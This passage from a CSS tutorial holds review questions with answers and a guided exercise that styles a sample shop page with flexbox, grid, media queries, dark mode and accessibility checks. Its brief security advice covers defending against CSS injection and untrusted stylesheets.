properties on MDN |\r\n| Hiding important content with `display: none` | Use proper accessible patterns |\r\n| Not testing on real devices and other browsers | Test in device mode and on at least two browsers |\r\n| Putting user input into CSS | Allow only validated, fixed values |\r\n\r\n**Part 3 summary.** You can build layouts with flexbox and grid, use positioning sparingly, make pages responsive with media queries, style interaction states and transitions, apply accessibility, performance, and security practices, debug with developer tools, and avoid the common mistakes.\r\n\r\n---\r\n\r\n## Part 4 of 4: Check Your Understanding and Practice\r\n\r\n### Section A: Questions and answers\r\n\r\n**Q1. What is the difference between HTML and CSS, and why keep them separate?**\r\n\r\n**Answer:** HTML defines the structure and meaning of the content, and CSS controls how it looks and is laid out. Keeping them separate means you can change the whole design by editing one stylesheet without touching the HTML, share one stylesheet across every page, and let assistive technology and search engines rely on the meaningful HTML.\r\n\r\n**Q2. Name the three ways to add CSS to a page. Which is best, and why?**\r\n\r\n**Answer:** An external stylesheet linked with `<link>`, an internal `<style>` block, and inline `style` attributes. The external stylesheet is best because one file serves every page, the browser caches it, it is easy to maintain, and it works with a strict Content Security Policy. Inline styles have very high priority and are hard to maintain.\r\n\r\n**Q3. Identify the parts of this rule: `p { color: navy; }`.**\r\n\r\n**Answer:** `p` is the selector. `{ color: navy; }` is the declaration block, which contains one declaration. `color` is the property and `navy` is the value. The colon separates property and value, and the semicolon ends the declaration.\r\n\r\n**Q4. A paragraph has `id=\"note\"` and `class=\"alert\"`. Rules exist for `p { color: black; }`, `.alert { color: orange; }`, and `#note { color: red; }`. What colour is the text, and why?**\r\n\r\n**Answer:** Red. All three rules match, but specificity decides: an ID selector is stronger than a class selector, which is stronger than an element selector. The order in the file does not matter here, because the specificity differs.\r\n\r\n**Q5. Why do most stylesheets begin with `*, *::before, *::after { box-sizing: border-box; }`?**\r\n\r\n**Answer:** By default `width` sets only the content width, and padding and border are added on top, so boxes end up larger than expected. With `border-box`, the width includes padding and border, which makes sizing much more predictable when building layouts.\r\n\r\n**Q6. When would you choose `rem` over `px` for font sizes, and why?**\r\n\r\n**Answer:** For almost all text and most spacing. `rem` is relative to the root font size, so it respects the user's browser text-size setting and scales consistently. Fixed pixel sizes may not adapt, which hurts people who need larger text. Pixels are fine for hairline borders and fine details.\r\n\r\n**Q7. When should you use flexbox, and when grid?**\r\n\r\n**Answer:** Use flexbox for layout in one direction, such as a row of navigation links, a toolbar, or centring one item. Use grid for two-dimensional layouts with rows and columns, such as a page layout or a card gallery. They are often used together: grid for the overall page and flexbox inside components.\r\n\r\n**Q8. What does \"mobile first\" mean, and what does a mobile-first media query look like?**\r\n\r\n**Answer:** It means writing the styles for small screens as the default, then adding rules for larger screens as the space allows, using `min-width` queries. For example, `@media (min-width: 48rem) { .layout { display: grid; grid-template-columns: 2fr 1fr; } }`. It keeps the base CSS simple and tends to perform better on phones.\r\n\r\n**Q9. Why is `outline: none` on focusable elements a problem, and what should you do instead?**\r\n\r\n**Answer:** Keyboard users rely on the focus indicator to see where they are on the page, and removing it makes the page nearly unusable for them. Instead, keep the default or provide a clear custom style using `:focus-visible`, with strong contrast, such as `outline: 3px solid #f2a900; outline-offset: 2px;`.\r\n\r\n**Q10. Name two security risks involving CSS and a defence for each.**\r\n\r\n**Answer:** CSS injection, where untrusted user input reaches a `<style>` block or `style` attribute and can restyle the page or leak data through attribute selectors and `url()` requests; defend by never inserting raw user input into CSS, allowing only a fixed list of values, and using a Content Security Policy. Untrusted third-party stylesheets, which can change your page at will; defend by hosting your own or using trusted providers, pinning versions, and using Subresource Integrity (`integrity` with `crossorigin=\"anonymous\"`).\r\n\r\n### Section B: Practical (one task, step by step)\r\n\r\n**Goal:** style the Harbor Goods home page from plain HTML into a clean, responsive, accessible page with a header and navigation, a hero section, a grid of product cards, a footer, and a dark mode. You will then inspect the styles in the browser and validate them.\r\n\r\n**What you need:** a computer, a web browser, and a plain text editor (Notepad on Windows, TextEdit in plain text mode on Mac, or a code editor such as Visual Studio Code). Allow about 60 to 75 minutes.\r\n\r\n**Step 1: Create the project folder.**\r\n\r\n1. Open your **Documents** (or **Desktop**) folder.\r\n2. Create a folder named `harbor-styles`.\r\n3. Open it and create a folder inside named `css`.\r\n\r\n**Step 2: Create the HTML file.**\r\n\r\n1. In your editor, create a new file and **Save As** `index.html` inside `harbor-styles` (not inside `css`). Save it as UTF-8, and make sure it ends in `.html` (on Windows, tick **File name extensions** in File Explorer's **View** menu if you cannot see the ending).\r\n2. Type this into it and save with `Ctrl + S` (or `Cmd + S`):\r\n\r\n```html\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <title>Harbor Goods | Boating and Outdoor Gear</title>\r\n    <meta name=\"description\" content=\"Quality boating and outdoor gear for life on the water.\">\r\n    <link rel=\"stylesheet\" href=\"css/style.css\">\r\n  </head>\r\n  <body>\r\n    <a class=\"skip\" href=\"#main\">Skip to main content</a>\r\n\r\n    <header class=\"site-header\">\r\n      <a class=\"logo\" href=\"index.html\">Harbor Goods</a>\r\n      <nav aria-label=\"Main\">\r\n        <ul class=\"nav-list\">\r\n          <li><a href=\"#products\">Products</a></li>\r\n          <li><a href=\"#about\">About</a></li>\r\n          <li><a href=\"#contact\">Contact</a></li>\r\n        </ul>\r\n      </nav>\r\n    </header>\r\n\r\n    <main id=\"main\">\r\n      <section class=\"hero\">\r\n        <h1>Gear for life on the water</h1>\r\n        <p>Tested life jackets, dry bags, and rope, shipped worldwide.</p>\r\n        <a class=\"button\" href=\"#products\">Shop now</a>\r\n      </section>\r\n\r\n      <section id=\"products\">\r\n        <h2>Featured products</h2>\r\n        <div class=\"card-grid\">\r\n          <article class=\"card\">\r\n            <h3>Coastal Pro Life Jacket</h3>\r\n            <p>Lightweight, comfortable, and tested for coastal use.</p>\r\n            <p class=\"price\">$48</p>\r\n            <a class=\"button\" href=\"#\">View details</a>\r\n          </article>\r\n          <article class=\"card featured\">\r\n            <h3>Harbor Dry Bag 30L</h3>\r\n            <p>Keeps your kit dry on the roughest day out.</p>\r\n            <p class=\"price\">$32</p>\r\n            <a class=\"button\" href=\"#\">View details</a>\r\n          </article>\r\n          <article class=\"card\">\r\n            <h3>Braided Dock Line</h3>\r\n            <p>Strong, soft, and easy on the hands.</p>\r\n            <p class=\"price\">$18</p>\r\n            <a class=\"button\" href=\"#\">View details</a>\r\n          </article>\r\n        </div>\r\n      </section>\r\n\r\n      <section id=\"about\">\r\n        <h2>About Harbor Goods</h2>\r\n        <p>\r\n          We are a small team of sailors and paddlers who test everything we\r\n          sell. If it does not survive a hard season on the water, it does not\r\n          go in the shop.\r\n        </p>\r\n      </section>\r\n    </main>\r\n\r\n    <footer id=\"contact\" class=\"site-footer\">\r\n      <p>&copy; 2026 Harbor Goods &middot; hello@harborgoods.example</p>\r\n    </footer>\r\n  </body>\r\n</html>\r\n```\r\n\r\n3. Double-click `index.html` to open it in your browser. You will see **unstyled** HTML: plain black text on white, with bullet points for the menu. This is your \"before\" picture. Keep the browser open, and after each step below save, switch to the browser, and press `F5`.\r\n\r\n**Step 3: Create the stylesheet and see it connect.**\r\n\r\n1. In your editor, create a new file and **Save As** `style.css` **inside the `css` folder**.\r\n2. Type this and save:\r\n\r\n```css\r\nbody {\r\n  background: #f4f8fb;\r\n}\r\n```\r\n\r\n3. Refresh the browser. The page background should turn pale blue. If nothing changes, the link is not connecting. Check that the file is `css/style.css`, that the folder is spelled `css`, and that the `<link>` in the head matches.\r\n\r\n**Step 4: Add variables and the base reset.**\r\n\r\nReplace the contents of `style.css` with:\r\n\r\n```css\r\n/* ========== Variables ========== */\r\n:root {\r\n  --blue: #0b3d5c;\r\n  --blue-dark: #082c43;\r\n  --light: #f4f8fb;\r\n  --card: #ffffff;\r\n  --text: #1c1c1c;\r\n  --border: #d6e2ea;\r\n  --accent: #f2a900;\r\n  --radius: 0.5rem;\r\n  --space: 1rem;\r\n}\r\n\r\n/* ========== Base ========== */\r\n*, *::before, *::after {\r\n  box-sizing: border-box;\r\n}\r\n\r\nbody {\r\n  margin: 0;\r\n  font-family: system-ui, -apple-system, \"Segoe UI\", Roboto, Arial, sans-serif;\r\n  font-size: 1rem;\r\n  line-height: 1.6;\r\n  color: var(--text);\r\n  background: var(--light);\r\n}\r\n```\r\n\r\nSave and refresh. The font should change to your system font, and the text should be slightly spaced out. Write in a notepad: what does `var(--light)` do?\r\n\r\n**Step 5: Style text, headings, and links.**\r\n\r\nAdd to the **end** of `style.css`:\r\n\r\n```css\r\nh1, h2, h3 {\r\n  line-height: 1.25;\r\n  margin-block: 0 0.5em;\r\n  color: var(--blue);\r\n}\r\n\r\nh1 { font-size: 2.25rem; }\r\nh2 { font-size: 1.6rem; margin-top: 2rem; }\r\nh3 { font-size: 1.25rem; }\r\n\r\np { max-width: 65ch; margin-block: 0 1em; }\r\n\r\na { color: var(--blue); }\r\na:hover { text-decoration: none; }\r\n```\r\n\r\nSave and refresh. The headings should turn dark blue, with different sizes. Hover over a link in the page to see the underline disappear.\r\n\r\n**Step 6: Constrain the page width and add spacing.**\r\n\r\nAdd to the end:\r\n\r\n```css\r\nmain,\r\n.site-header,\r\n.site-footer {\r\n  max-width: 60rem;\r\n  margin: 0 auto;\r\n  padding: var(--space);\r\n}\r\n```\r\n\r\nSave and refresh. The content should now sit in a centred column. Resize the browser window and notice that the column shrinks gracefully when the window is narrow, because we used `max-width` and not `width`.\r\n\r\n**Step 7: Lay out the header and navigation with flexbox.**\r\n\r\nAdd:\r\n\r\n```css\r\n.site-header {\r\n  display: flex;\r\n  justify-content: space-between;\r\n  align-items: center;\r\n  flex-wrap: wrap;\r\n  gap: var(--space);\r\n}\r\n\r\n.logo {\r\n  font-size: 1.4rem;\r\n  font-weight: 700;\r\n  text-decoration: none;\r\n}\r\n\r\n.nav-list {\r\n  display: flex;\r\n  gap: 1.25rem;\r\n  list-style: none;\r\n  margin: 0;\r\n  padding: 0;\r\n}\r\n```\r\n\r\nSave and refresh. The logo should sit on the left and the menu in a row on the right, with no bullet points. **Experiment:** change `justify-content: space-between` to `center`, refresh, and observe. Then change it back.\r\n\r\n**Step 8: Style the hero section.**\r\n\r\nAdd:\r\n\r\n```css\r\n.hero {\r\n  background: linear-gradient(135deg, var(--blue), #1d6f9f);\r\n  color: #fff;\r\n  border-radius: var(--radius);\r\n  padding: 2.5rem var(--space);\r\n}\r\n\r\n.hero h1 { color: #fff; }\r\n```\r\n\r\nSave and refresh. The hero should show a blue gradient with white text. Note that white text on this blue has high contrast.\r\n\r\n**Step 9: Create a button component.**\r\n\r\nAdd:\r\n\r\n```css\r\n.button {\r\n  display: inline-block;\r\n  background: var(--accent);\r\n  color: #1c1c1c;\r\n  padding: 0.6rem 1.25rem;\r\n  border-radius: var(--radius);\r\n  font-weight: 600;\r\n  text-decoration: none;\r\n  transition: background-color 0.2s ease, transform 0.2s ease;\r\n}\r\n\r\n.button:hover {\r\n  background: #ffc233;\r\n}\r\n\r\n.button:active {\r\n  transform: translateY(1px);\r\n}\r\n\r\n.button:focus-visible {\r\n  outline: 3px solid var(--blue-dark);\r\n  outline-offset: 3px;\r\n}\r\n```\r\n\r\nSave and refresh. Test the buttons three ways: **hover** over one, **press** and hold the mouse down, and then press the `Tab` key repeatedly until a button receives keyboard focus. You should see a clear dark outline around the focused button. This is the accessibility feature you must never remove.\r\n\r\n**Step 10: Build the product card grid with CSS Grid.**\r\n\r\nAdd:\r\n\r\n```css\r\n.card-grid {\r\n  display: grid;\r\n  grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));\r\n  gap: var(--space);\r\n}\r\n\r\n.card {\r\n  background: var(--card);\r\n  border: 1px solid var(--border);\r\n  border-radius: var(--radius);\r\n  padding: var(--space);\r\n  box-shadow: 0 2px 6px rgb(0 0 0 / 0.08);\r\n}\r\n\r\n.card h3 { margin-top: 0; }\r\n\r\n.price {\r\n  font-size: 1.25rem;\r\n  font-weight: 700;\r\n  color: var(--blue);\r\n}\r\n\r\n.card.featured {\r\n  border-color: var(--accent);\r\n  border-width: 2px;\r\n}\r\n```\r\n\r\nSave and refresh. You should see three cards in a row (on a wide window), with the middle one outlined in gold. **Now resize the browser window** narrower and wider. The cards should wrap into fewer columns automatically, with no media query.\r\n\r\n**Step 11: Style the footer and the skip link.**\r\n\r\nAdd:\r\n\r\n```css\r\n.site-footer {\r\n  margin-top: 2rem;\r\n  border-top: 1px solid var(--border);\r\n  text-align: center;\r\n}\r\n\r\n.skip {\r\n  position: absolute;\r\n  left: -999px;\r\n}\r\n.skip:focus {\r\n  left: var(--space);\r\n  top: var(--space);\r\n  background: #fff;\r\n  color: #000;\r\n  padding: 0.5rem 1rem;\r\n  z-index: 10;\r\n}\r\n```\r\n\r\nSave and refresh. Click once in the empty page background, then press `Tab`. The \"Skip to main content\" link should appear at the top-left, then disappear again when you press `Tab` a second time.\r\n\r\n**Step 12: Make the layout responsive.**\r\n\r\n1. Add a small-screen rule for the hero and navigation. At the **end** of the file, add:\r\n\r\n```css\r\n/* ========== Larger screens ========== */\r\n@media (min-width: 48rem) {\r\n  .hero {\r\n    padding: 4rem 2rem;\r\n  }\r\n  .hero h1 {\r\n    font-size: 3rem;\r\n  }\r\n}\r\n```\r\n\r\n2. Save and refresh. Make the browser window wide: the hero should get roomier and its heading larger. Make it narrow: it returns to the compact version.\r\n3. Open developer tools (`F12`), click the **device mode** icon (a phone and tablet symbol), and choose a phone size. Check that nothing overflows sideways, the menu still fits (it wraps if needed), and the cards stack in one column.\r\n\r\n**Step 13: Add dark mode.**\r\n\r\nAdd at the very end of the file:\r\n\r\n```css\r\n/* ========== User preferences ========== */\r\n@media (prefers-color-scheme: dark) {\r\n  :root {\r\n    --blue: #8cc6ea;\r\n    --blue-dark: #cfe8f7;\r\n    --light: #101820;\r\n    --card: #18232d;\r\n    --text: #eef3f6;\r\n    --border: #2c3b48;\r\n  }\r\n  .hero { background: linear-gradient(135deg, #0b3d5c, #135680); }\r\n}\r\n\r\n@media (prefers-reduced-motion: reduce) {\r\n  * { transition: none !important; animation: none !important; }\r\n}\r\n```\r\n\r\nTest dark mode: in developer tools, press `Ctrl + Shift + P` (or `Cmd + Shift + P`), type `Render`, choose **Show Rendering**, and set **Emulate CSS media feature prefers-color-scheme** to **dark**. The whole page should switch colours by changing only the variables. Switch back to light afterwards.\r\n\r\n**Step 14: Inspect the styles with developer tools.**\r\n\r\n1. Right-click a product card and choose **Inspect**.\r\n2. In the **Styles** pane, find the `.card` rule. Click the tick box beside `box-shadow` to turn it off, and watch the shadow disappear. Tick it again.\r\n3. Click on the `padding` value, change it to `2rem`, and see the card grow. (Changes vanish on refresh.)\r\n4. Look at the **box model diagram** (in the **Computed** tab) and find the margin, border, padding, and content sizes.\r\n5. Select the `h2` heading and find where its `color` comes from in the **Styles** pane.\r\n6. Select a `.button` and press the **:hov** button in the Styles pane to force the `:hover` state, and see those styles apply.\r\n\r\n**Step 15: A specificity experiment.**\r\n\r\nYou will see for yourself how the cascade picks winners.\r\n\r\n1. Add this rule to the end of `style.css`:\r\n\r\n```css\r\nh3 { color: crimson; }\r\n```\r\n\r\n2. Save and refresh. The card titles (`h3`) are still **blue**, not crimson, or are they? Inspect one. In the Styles pane, you should see the earlier rule (`h1, h2, h3 { color: var(--blue); }`) and the new one. Both have the same specificity (one element selector), so the **later** one wins, and your card titles turn crimson. Write down why.\r\n3. Now add a stronger rule:\r\n\r\n```css\r\n.card h3 { color: darkgreen; }\r\n```\r\n\r\n4. Save and refresh. The titles turn green, even though `h3 { color: crimson; }` comes **later** in some orderings, because `.card h3` has higher specificity (a class plus an element) than `h3` alone. Move the `.card h3` rule above `h3 { color: crimson; }` and refresh again. Which colour wins, and why?\r\n5. **Undo the experiment:** delete the crimson and green rules.\r\n\r\n**Step 16: Break things on purpose.**\r\n\r\nMake each change one at a time, observe the result in the browser and in the **Styles** pane, then undo it:\r\n\r\n1. Delete a semicolon at the end of a declaration in `.card`. What happens to that and the following declaration?\r\n2. Misspell a property: `backgroud: red;`. In developer tools, how does the browser show that it is invalid?\r\n3. Delete `box-sizing: border-box` from the reset and refresh. Does anything shift?\r\n4. Remove the viewport meta tag from the HTML, refresh in device mode, and compare the phone view. Put it back.\r\n5. Add `outline: none;` to `.button:focus-visible` and `Tab` to a button. Describe what a keyboard user would lose. Then restore the outline.\r\n\r\n**Step 17: Check accessibility and validate.**\r\n\r\n1. Open **Lighthouse** in the developer tools, tick **Accessibility**, and run it. Read any warnings (for example contrast or touch target size) and fix at least one.\r\n2. Zoom the page to 200% with `Ctrl` and `+` (or `Cmd` and `+`). Check that text does not overlap or get clipped, and that nothing needs sideways scrolling.\r\n3. Go to `jigsaw.w3.org/css-validator`, choose **By direct input**, paste the whole of `style.css`, and click **Check**. Fix any errors. (Some warnings about modern features such as `prefers-color-scheme` or CSS variables may appear, depending on the validator version. Read each one and decide whether it is a real mistake.)\r\n\r\n**Step 18: Security and safety review.**\r\n\r\nAnswer in a notepad:\r\n\r\n1. Does your page use any inline `style=\"\"` attributes? (It should not.) Why does that matter for a strict Content Security Policy?\r\n2. Is any user-provided text inserted into your CSS? (There should be none.) How would you safely let a visitor choose a theme?\r\n3. Do you load any stylesheet or font from another website? If you did, what would you add to check its integrity?\r\n4. Does any CSS hide important content with `display: none` that a screen reader user needs?\r\n\r\n**Step 19: Reflect.**\r\n\r\nAnswer in a notepad (one or two lines each):\r\n\r\n1. Which three CSS properties had the biggest visual effect on the page?\r\n2. Why did the card grid reflow without a media query?\r\n3. How did changing only the variables switch the page to dark mode?\r\n4. Why does `rem` help users who increase their browser text size?\r\n5. What would you add next (for example a form, an image, or an animation), and which CSS ideas would you need?\r\n6. Which step surprised you most, and why?\r\n\r\n**Finished check.** You should have: an unstyled HTML page and a linked `css/style.css`; CSS variables and a `box-sizing` reset; styled typography, links, and a centred layout; a flexbox header and navigation; a gradient hero; a button with hover, active, and visible focus states; a responsive grid of cards; a skip link; a media query for larger screens; dark mode and reduced-motion support; no inline styles; a clean accessibility check; and a valid stylesheet.\r\n\r\n### Self-check\r\n\r\n| Skill | Done |\r\n|---|---|\r\n| Explain what CSS does and why it is separate from HTML | ☐ |\r\n| Read and write a CSS rule (selector, property, value) | ☐ |\r\n| Add CSS with an external stylesheet | ☐ |\r\n| Use element, class, descendant, attribute, and pseudo-class selectors | ☐ |\r\n| Explain the cascade, specificity, and inheritance | ☐ |\r\n| Avoid IDs for styling and avoid `!important` | ☐ |\r\n| Use colours and check contrast | ☐ |\r\n| Choose between `px`, `rem`, `em`, `%`, and viewport units | ☐ |\r\n| Set fonts with a fallback stack | ☐ |\r\n| Apply the box model and `box-sizing: border-box` | ☐ |\r\n| Explain margin collapsing | ☐ |\r\n| Use `display` values correctly | ☐ |\r\n| Use CSS variables | ☐ |\r\n| Build layouts with flexbox | ☐ |\r\n| Build layouts with grid | ☐ |\r\n| Use media queries mobile first | ☐ |\r\n| Respect `prefers-color-scheme` and `prefers-reduced-motion` | ☐ |\r\n| Style hover, focus, and active states | ☐ |\r\n| Keep a visible focus indicator | ☐ |\r\n| Apply accessibility practices in CSS | ☐ |\r\n| Avoid CSS injection and untrusted stylesheets | ☐ |\r\n| Debug with the Styles, Computed, and box model panels | ☐ |\r\n| Validate CSS and audit with Lighthouse | ☐ |\r\n\r\n**Lesson complete.**";
